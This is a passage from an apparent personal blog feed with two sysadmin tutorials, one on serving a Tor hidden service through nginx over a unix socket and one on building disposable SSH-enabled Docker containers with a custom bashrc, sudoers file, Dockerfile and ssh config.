class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">        #listen 127.0.0.1:80;</span><br><span class="line">        listen unix:&#x2F;var&#x2F;run&#x2F;nginx-tor.sock;</span><br><span class="line"></span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html&#x2F;tor&#x2F;;</span><br><span class="line"></span><br><span class="line">        index index.html index.php;</span><br><span class="line"></span><br><span class="line">        server_name _;</span><br><span class="line">        #server_name lcr[...]vijybok6d2yepvyqd.onion;</span><br><span class="line"></span><br><span class="line">        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;tor-access.log;</span><br><span class="line">        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;tor-error.log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($request_method !~ ^(GET|HEAD|POST)$ )&#123;</span><br><span class="line">          return 405;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>enable tor site in Nginx :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;tor &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;</span><br></pre></td></tr></table></figure><p>Start php-fpm service :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service php7.4-fpm start</span><br></pre></td></tr></table></figure><p>Create a simple web page:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">sudo mkdir tor</span><br><span class="line">cd tor</span><br><span class="line">sudo nano index.php</span><br></pre></td></tr></table></figure><p>Add :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo uniqid(&#39;My-tor-portal::&#39;, true);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>To get some content ;)</p><p>Set right on portal files/folders</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R www-data:www-data tor</span><br></pre></td></tr></table></figure><p>Start nginx server:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx start</span><br></pre></td></tr></table></figure><h1 id="Configure-Tor"><a href="#Configure-Tor" class="headerlink" title="Configure Tor"></a>Configure Tor</h1><p>configure /etc/tor/torrc file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;tor&#x2F;torrc</span><br><span class="line"></span><br><span class="line"># add in section &quot;This section is just for location-hidden services&quot;</span><br><span class="line"></span><br><span class="line">HiddenServiceDir &#x2F;var&#x2F;lib&#x2F;tor&#x2F;myService&#x2F;</span><br><span class="line">HiddenServicePort 80 unix:&#x2F;var&#x2F;run&#x2F;nginx-tor.sock</span><br></pre></td></tr></table></figure><p>Your service files will be in “/var/lib/tor/myService”.</p><h1 id="Start-Tor"><a href="#Start-Tor" class="headerlink" title="Start Tor"></a>Start Tor</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">screen -S tor</span><br><span class="line">sudo -u debian-tor tor -f &#x2F;etc&#x2F;tor&#x2F;torrc </span><br><span class="line">[...]</span><br><span class="line">MMM xx 13:50:59.000 [notice] Bootstrapped 95% (circuit_create): Establishing a Tor circuit</span><br><span class="line">MMM xx 13:51:00.000 [notice] Bootstrapped 100% (done): Done</span><br></pre></td></tr></table></figure><ul><li><strong>[CTRL+A and CTRL+D]</strong> to exit screen without kill it and run command in background</li><li><strong>screen -ls</strong> to show your screen session</li><li><strong>screen -r tor</strong> to attach your session</li></ul><h1 id="Find-your-Tor-URL"><a href="#Find-your-Tor-URL" class="headerlink" title="Find your Tor URL"></a>Find your Tor URL</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cat &#x2F;var&#x2F;lib&#x2F;tor&#x2F;myService&#x2F;hostname</span><br><span class="line">xbt52kwof7g32bxrbznefvtotc3lpzcxtfagbbny2hmpzzcmch6iivyd.onion</span><br></pre></td></tr></table></figure><p>Edit nginx configuration to match hostname :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;nginx&#x2F;sites-ava</span><br><span class="line"># change server_name _; by your onion address</span><br><span class="line">server_name xbt52kwof7g32bxrbznefvtotc3lpzcxtfagbbny2hmpzzcmch6iivyd.onion;</span><br><span class="line"></span><br><span class="line"># save file</span><br><span class="line"># stop nginx : sudo service nginx stop</span><br><span class="line"># sudo rm &#x2F;var&#x2F;run&#x2F;nginx-tor.sock   </span><br><span class="line"># restart nginx : sudo nginx start</span><br></pre></td></tr></table></figure><p>Now you can access your service with tor-browser, Brave, socks5 …</p><p><img src="/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/tor-access.gif" alt="tor hidden service access"></p><p>In case you want to test if your unix socket work you can run :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --unix-socket &#x2F;var&#x2F;run&#x2F;nginx-tor.sock http:&#x2F;index.php</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/tor-header.png&quot; alt=&quot;tor hidden service&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="tor" scheme="https://0x25.github.io/tags/tor/"/>
    
    <category term="hidden service" scheme="https://0x25.github.io/tags/hidden-service/"/>
    
    <category term="unix socket" scheme="https://0x25.github.io/tags/unix-socket/"/>
    
  </entry>
  
  <entry>
    <title>Docker SSH on the fly</title>
    <link href="https://0x25.github.io/2021/03/10/Docker-SSH-on-the-fly/"/>
    <id>https://0x25.github.io/2021/03/10/Docker-SSH-on-the-fly/</id>
    <published>2021-03-10T21:00:45.000Z</published>
    <updated>2021-05-02T13:15:07.955Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/03/10/Docker-SSH-on-the-fly/docker-ssh-header.png" alt="Docker SSH on the fly"></p><h1 id="purpose"><a href="#purpose" class="headerlink" title="purpose"></a>purpose</h1><p>Create an image, a script and a bit of local configuration to pop SSH container on the …. fly.</p><h1 id="prerequisite"><a href="#prerequisite" class="headerlink" title="prerequisite"></a>prerequisite</h1><p>Have docker <a href="https://docs.docker.com/engine/install/ubuntu/">installed</a>.</p><p>Create a folder to start the project and add configFiles/  </p><p>Create configFiles/bashrc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"># ~&#x2F;.bashrc: executed by bash(1) for non-login shells.</span><br><span class="line"># see &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bash&#x2F;examples&#x2F;startup-files (in the package bash-doc)</span><br><span class="line"># for examples</span><br><span class="line"></span><br><span class="line"># If not running interactively, don&#39;t do anything</span><br><span class="line">case $- in</span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) return;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># don&#39;t put duplicate lines or lines starting with space in the history.</span><br><span class="line"># See bash(1) for more options</span><br><span class="line">HISTCONTROL&#x3D;ignoreboth</span><br><span class="line"></span><br><span class="line"># append to the history file, don&#39;t overwrite it</span><br><span class="line">shopt -s histappend</span><br><span class="line"></span><br><span class="line"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br><span class="line">HISTSIZE&#x3D;1000</span><br><span class="line">HISTFILESIZE&#x3D;2000</span><br><span class="line"></span><br><span class="line"># check the window size after each command and, if necessary,</span><br><span class="line"># update the values of LINES and COLUMNS.</span><br><span class="line">shopt -s checkwinsize</span><br><span class="line"></span><br><span class="line"># If set, the pattern &quot;**&quot; used in a pathname expansion context will</span><br><span class="line"># match all files and zero or more directories and subdirectories.</span><br><span class="line">#shopt -s globstar</span><br><span class="line"></span><br><span class="line"># make less more friendly for non-text input files, see lesspipe(1)</span><br><span class="line">[ -x &#x2F;usr&#x2F;bin&#x2F;lesspipe ] &amp;&amp; eval &quot;$(SHELL&#x3D;&#x2F;bin&#x2F;sh lesspipe)&quot;</span><br><span class="line"></span><br><span class="line"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="line">if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r &#x2F;etc&#x2F;debian_chroot ]; then</span><br><span class="line">    debian_chroot&#x3D;$(cat &#x2F;etc&#x2F;debian_chroot)</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">    xterm-color|*-256color) color_prompt&#x3D;yes;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># uncomment for a colored prompt, if the terminal has the capability; turned</span><br><span class="line"># off by default to not distract the user: the focus in a terminal window</span><br><span class="line"># should be on the output of commands, not on the prompt</span><br><span class="line">#force_color_prompt&#x3D;yes</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$force_color_prompt&quot; ]; then</span><br><span class="line">    if [ -x &#x2F;usr&#x2F;bin&#x2F;tput ] &amp;&amp; tput setaf 1 &gt;&amp;&#x2F;dev&#x2F;null; then</span><br><span class="line"># We have color support; assume it&#39;s compliant with Ecma-48</span><br><span class="line"># (ISO&#x2F;IEC-6429). (Lack of such support is extremely rare, and such</span><br><span class="line"># a case would tend to support setf rather than setaf.)</span><br><span class="line">color_prompt&#x3D;yes</span><br><span class="line">    else</span><br><span class="line">color_prompt&#x3D;</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># custom</span><br><span class="line">IP&#x3D;$(tac &#x2F;etc&#x2F;hosts | head -n 1 | awk &#39;&#123;print $1&#125;&#39;)</span><br><span class="line">if [ ! -f .colorc ]; then</span><br><span class="line">    COLOR&#x3D;$((1 + $RANDOM % 256))</span><br><span class="line">    echo -ne $COLOR &gt; .colorc</span><br><span class="line">else</span><br><span class="line">    COLOR&#x3D;$(cat .colorc)</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$color_prompt&quot; &#x3D; yes ]; then</span><br><span class="line">    PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[48;5;$&#123;COLOR&#125;m\](Docker)\[\033[00m\]\[\033[01;95m\] \u@$&#123;IP&#125;\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span><br><span class="line">else</span><br><span class="line">    PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#39;</span><br><span class="line">fi</span><br><span class="line">unset color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"># If this is an xterm set the title to user@host:dir</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1&#x3D;&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># enable color support of ls and also add handy aliases</span><br><span class="line">if [ -x &#x2F;usr&#x2F;bin&#x2F;dircolors ]; then</span><br><span class="line">    test -r ~&#x2F;.dircolors &amp;&amp; eval &quot;$(dircolors -b ~&#x2F;.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;</span><br><span class="line">    alias ls&#x3D;&#39;ls --color&#x3D;auto&#39;</span><br><span class="line">    #alias dir&#x3D;&#39;dir --color&#x3D;auto&#39;</span><br><span class="line">    #alias vdir&#x3D;&#39;vdir --color&#x3D;auto&#39;</span><br><span class="line"></span><br><span class="line">    alias grep&#x3D;&#39;grep --color&#x3D;auto&#39;</span><br><span class="line">    alias fgrep&#x3D;&#39;fgrep --color&#x3D;auto&#39;</span><br><span class="line">    alias egrep&#x3D;&#39;egrep --color&#x3D;auto&#39;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># colored GCC warnings and errors</span><br><span class="line">#export GCC_COLORS&#x3D;&#39;error&#x3D;01;31:warning&#x3D;01;35:note&#x3D;01;36:caret&#x3D;01;32:locus&#x3D;01:quote&#x3D;01&#39;</span><br><span class="line"></span><br><span class="line"># some more ls aliases</span><br><span class="line">alias ll&#x3D;&#39;ls -alF&#39;</span><br><span class="line">alias la&#x3D;&#39;ls -A&#39;</span><br><span class="line">alias l&#x3D;&#39;ls -CF&#39;</span><br><span class="line"></span><br><span class="line"># You may want to put all your additions into a separate file like</span><br><span class="line"># ~&#x2F;.bash_aliases, instead of adding them here directly.</span><br><span class="line"># See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bash-doc&#x2F;examples in the bash-doc package.</span><br><span class="line"></span><br><span class="line">if [ -f ~&#x2F;.bash_aliases ]; then</span><br><span class="line">    . ~&#x2F;.bash_aliases</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># enable programmable completion features (you don&#39;t need to enable</span><br><span class="line"># this, if it&#39;s already enabled in &#x2F;etc&#x2F;bash.bashrc and &#x2F;etc&#x2F;profile</span><br><span class="line"># sources &#x2F;etc&#x2F;bash.bashrc).</span><br><span class="line">if ! shopt -oq posix; then</span><br><span class="line">  if [ -f &#x2F;usr&#x2F;share&#x2F;bash-completion&#x2F;bash_completion ]; then</span><br><span class="line">    . &#x2F;usr&#x2F;share&#x2F;bash-completion&#x2F;bash_completion</span><br><span class="line">  elif [ -f &#x2F;etc&#x2F;bash_completion ]; then</span><br><span class="line">    . &#x2F;etc&#x2F;bash_completion</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>Create a configFiles/sudoers  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># This file MUST be edited with the &#39;visudo&#39; command as root.</span><br><span class="line">#</span><br><span class="line"># Please consider adding local content in &#x2F;etc&#x2F;sudoers.d&#x2F; instead of</span><br><span class="line"># directly modifying this file.</span><br><span class="line">#</span><br><span class="line"># See the man page for details on how to write a sudoers file.</span><br><span class="line">#</span><br><span class="line">Defaultsenv_reset</span><br><span class="line">Defaultsmail_badpass</span><br><span class="line">Defaultssecure_path&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;snap&#x2F;bin&quot;</span><br><span class="line"></span><br><span class="line"># Host alias specification</span><br><span class="line"></span><br><span class="line"># User alias specification</span><br><span class="line"></span><br><span class="line"># Cmnd alias specification</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">rootALL&#x3D;(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL&#x3D;(ALL) ALL</span><br><span class="line"></span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo  ALL&#x3D;(ALL) NOPASSWD: ALL</span><br><span class="line"></span><br><span class="line"># See sudoers(5) for more information on &quot;#include&quot; directives:</span><br><span class="line"></span><br><span class="line">#includedir &#x2F;etc&#x2F;sudoers.d</span><br></pre></td></tr></table></figure><p>Add your SSH <a href="https://www.ssh.com/ssh/keygen/">public key</a> and paste it to configFiles/id_rsa.pub</p><p>Finally :  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">configFiles&#x2F;</span><br><span class="line">├── bashrc</span><br><span class="line">├── id_rsa.pub</span><br><span class="line">└── sudoers</span><br></pre></td></tr></table></figure><h1 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h1><p>first create a Dockerfile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># Update and install component</span></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get -y install openssh-server sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># add sudoers right</span></span><br><span class="line">ADD configFiles/sudoers /etc/sudoers</span><br><span class="line">RUN mkdir /var/run/sshd; chmod 755 /var/run/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a local user</span></span><br><span class="line">RUN groupadd <span class="built_in">local</span></span><br><span class="line">RUN useradd -m -s /bin/bash -g <span class="built_in">local</span> -G sudo -u 1000 <span class="built_in">local</span></span><br><span class="line">RUN mkdir /home/<span class="built_in">local</span>/.ssh; chmod 700 /home/<span class="built_in">local</span>/.ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># add bashrc with cool prompt</span></span><br><span class="line">ADD configFiles/bashrc /home/<span class="built_in">local</span>/.bashrc</span><br><span class="line">ADD configFiles/bashrc /root/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># add your public SSH key</span></span><br><span class="line">ADD configFiles/id_rsa.pub /home/<span class="built_in">local</span>/.ssh/authorized_keys</span><br><span class="line">RUN chmod 600 /home/<span class="built_in">local</span>/.ssh/authorized_keys</span><br><span class="line">RUN chown -R <span class="built_in">local</span>:<span class="built_in">local</span> home/<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove some file to get a clean start</span></span><br><span class="line">RUN rm /etc/update-motd.d/*</span><br><span class="line">RUN rm /etc/legal</span><br><span class="line">RUN touch /home/<span class="built_in">local</span>/.sudo_as_admin_successful</span><br><span class="line"></span><br><span class="line"><span class="comment"># start SSH</span></span><br><span class="line">EXPOSE 22</span><br><span class="line">CMD [<span class="string">&quot;/usr/sbin/sshd&quot;</span>,<span class="string">&quot;-D&quot;</span>]</span><br></pre></td></tr></table></figure><p>Now to create the image run :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t docker_ssh --label latest --pull .</span><br></pre></td></tr></table></figure><p>This will create the image : <strong>docker_ssh:latest</strong></p><h1 id="SSH-config"><a href="#SSH-config" class="headerlink" title="SSH config"></a>SSH config</h1><p>Configure your .ssh/config file (create or modify), and add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host 172.17.*.*</span><br><span class="line">User <span class="built_in">local</span></span><br><span class="line">StrictHostKeyChecking no</span><br><span class="line">IdentityFile ~/.ssh/id_rsa.pkey</span><br><span class="line">LogLevel QUIET</span><br></pre></td></tr></table></figure><p>for the IP 172.17.0.0/16 (default docker range)<br>use user “local”<br>don’t check the key (on local env only)<br>use your private key (change if needed)<br>no log  </p><h1 id="Bash-script-to-start-SSH-container-on-the-fly"><a href="#Bash-script-to-start-SSH-container-on-the-fly" class="headerlink" title="Bash script to start SSH container on the fly"></a>Bash script to start SSH container on the fly</h1><p>startDocker_ssh.sh  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">docker_name&#x3D;&quot;ssh&quot;</span><br><span class="line">docker_image&#x3D;&#39;docker_ssh&#39;</span><br><span class="line"></span><br><span class="line"># help</span><br><span class="line">usage()&#123;</span><br><span class="line">  echo &quot;-n [name] for the docker name prefix, default : $&#123;docker_name&#125;&quot;</span><br><span class="line">echo &quot;-l for the number of docker, default : 1&quot;</span><br><span class="line">echo &quot;-i for the docker image name , default : $&#123;docker_image&#125;&quot;</span><br><span class="line">echo &quot;-h for the help&quot;</span><br><span class="line">  exit 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">random_id()&#123;</span><br><span class="line">echo $(cat &#x2F;dev&#x2F;random | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 4 | head -n 1)</span><br><span class="line">&#125;</span><br><span class="line">loop&#x3D;1</span><br><span class="line"></span><br><span class="line">while getopts &quot;:n:i:l:h&quot; options; do</span><br><span class="line"></span><br><span class="line">case &quot;$&#123;options&#125;&quot; in</span><br><span class="line">h)</span><br><span class="line">usage</span><br><span class="line">exit</span><br><span class="line">;;</span><br><span class="line">n)</span><br><span class="line">docker_name&#x3D;$&#123;OPTARG&#125;</span><br><span class="line">;;</span><br><span class="line">  i)</span><br><span class="line">    docker_image&#x3D;$&#123;OPTARG&#125;</span><br><span class="line">    ;;</span><br><span class="line">l)</span><br><span class="line">loop&#x3D;$&#123;OPTARG&#125;</span><br><span class="line">re_isanum&#x3D;&#39;^[0-9]+$&#39;</span><br><span class="line">if ! [[ $loop &#x3D;~ $re_isanum ]]; then</span><br><span class="line"></span><br><span class="line">echo &quot;Error: i must be a num&quot;</span><br><span class="line">usage</span><br><span class="line">exit 2</span><br><span class="line">elif [ $loop -eq &quot;0&quot; ]; then</span><br><span class="line"></span><br><span class="line">echo &quot;Error: i must be &gt; 0&quot;</span><br><span class="line">usage</span><br><span class="line">exit 3</span><br><span class="line">fi</span><br><span class="line">;;</span><br><span class="line">:)</span><br><span class="line">echo &quot;Error: -$&#123;OPTARG&#125; requires an argument.&quot;</span><br><span class="line">usage</span><br><span class="line">exit 4</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;Error: fail option...&quot;</span><br><span class="line">usage</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">ips&#x3D;()</span><br><span class="line"></span><br><span class="line">for (( c&#x3D;1; c&lt;&#x3D;$loop; c++ )); do</span><br><span class="line"></span><br><span class="line">id&#x3D;$(random_id)</span><br><span class="line">name&#x3D;&quot;$&#123;docker_name&#125;_$&#123;id&#125;&quot;</span><br><span class="line">#echo &quot;Create docker : [$name]&quot;</span><br><span class="line">uuid&#x3D;$(docker run -d --name $name 